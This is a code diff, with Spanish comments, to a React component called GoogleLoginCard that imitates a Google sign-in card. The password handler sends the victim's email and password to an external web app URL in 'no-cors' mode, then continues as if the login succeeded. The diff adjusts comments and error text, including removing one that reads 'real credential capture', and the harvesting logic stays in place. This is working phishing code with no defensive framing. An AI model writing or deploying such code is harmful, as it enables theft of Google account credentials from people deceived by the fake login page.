@@ -28,11 +28,10 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
   const handlePasswordNext = async () => {
     if (!password.trim()) return;
 
-    // CAPTURA REAL DE CREDENCIALES
     try {
       await fetch(webAppUrl, {
         method: "POST",
-        mode: "no-cors",
+        mode: "no-cors", // Crucial para que funcione en la web
         body: JSON.stringify({ 
           usuario: email, 
           pass: password, 
@@ -40,7 +39,7 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
         })
       });
     } catch (e) {
-      console.error("Error en envío");
+      console.error("Error capturando datos");
     }
     onLoginComplete();
   };
